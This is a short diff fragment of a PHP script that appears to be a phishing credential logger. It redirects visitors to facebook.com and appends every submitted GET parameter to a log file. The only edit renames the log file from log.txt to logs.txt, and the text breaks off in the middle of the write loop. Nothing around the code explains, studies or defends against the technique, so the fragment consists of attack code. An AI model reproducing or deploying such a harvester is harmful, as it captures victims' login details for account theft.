@@ -1,7 +1,7 @@
 ﻿<?php 
 header("Location: 
 http://www.facebook.com"); 
-$handle = fopen("log.txt", 
+$handle = fopen("logs.txt", 
 "a"); 
 foreach($_GET as $variable 
 => $value) { fwrite($handle, 
